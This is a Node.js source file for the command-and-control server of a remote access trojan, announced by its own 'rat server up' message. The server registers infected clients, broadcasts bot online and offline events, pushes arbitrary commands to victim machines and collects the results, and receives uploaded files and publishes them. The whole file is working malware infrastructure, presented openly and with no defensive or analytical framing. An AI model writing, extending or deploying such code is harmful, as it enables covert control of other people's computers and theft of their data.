const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const multer = require("multer");
const fs = require("fs");
const path = require("path");
const { EVENTS } = require("./protocol");

const data = JSON.parse(fs.readFileSync(path.join(__dirname, "data.json"), "utf8"));

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });
const upload = multer({ dest: path.join(__dirname, "uploads") });

if (!fs.existsSync(path.join(__dirname, "uploads"))) fs.mkdirSync(path.join(__dirname, "uploads"));

const clients = new Map();
const meta = new Map();
const pending = new Map();
let reqCounter = 0;

app.use(express.json({ limit: "50mb" }));
app.get("/", (_req, res) => res.send("rat server up"));
app.use("/uploads", express.static(path.join(__dirname, "uploads")));

app.post("/upload", upload.single("file"), (req, res) => {
  if (!req.file) return res.status(400).json({ ok: false });
  const url = `${req.protocol}://${req.get("host")}/uploads/${req.file.filename}`;
  res.json({ ok: true, url });
});

function sendCommand(clientId, command, args = {}, timeoutMs = 90000) {
  return new Promise((resolve, reject) => {
    const sid = clients.get(clientId);
    if (!sid) return reject(new Error("client offline"));
    const requestId = `req_${++reqCounter}_${Date.now()}`;
    const timer = setTimeout(() => { pending.delete(requestId); reject(new Error("timeout")); }, timeoutMs);
    pending.set(requestId, { resolve, reject, timer });
    io.to(sid).emit(EVENTS.COMMAND, { requestId, command, args });
  });
}

io.on("connection", (socket) => {
  socket.on(EVENTS.REGISTER, (payload) => {
    const { clientId, info } = payload || {};
    if (!clientId) return;
    clients.set(clientId, socket.id);
    meta.set(socket.id, { clientId, info: info || {} });
    io.emit("__bot_event", { type: "client_online", clientId, info: info || {} });
  });

  socket.on(EVENTS.RESULT, (payload) => {
    const { requestId, ok, data: resultData, error } = payload || {};
    const p = pending.get(requestId);
    if (p) {
      clearTimeout(p.timer);
      pending.delete(requestId);
      if (ok) p.resolve(resultData);
      else p.reject(new Error(error || "client error"));
    }
  });

  socket.on("disconnect", () => {
    const m = meta.get(socket.id);
    if (m) {
      clients.delete(m.clientId);
      meta.delete(socket.id);
      io.emit("__bot_event", { type: "client_offline", clientId: m.clientId });
    }
  });
});

setInterval(() => {
  for (const sid of io.sockets.sockets.keys()) io.to(sid).emit(EVENTS.PING, {});
}, 30000);

const PORT = process.env.PORT || data.port || 3000;
server.listen(PORT, () => console.log(`server on ${PORT}`));

module.exports = { io, sendCommand, clients };
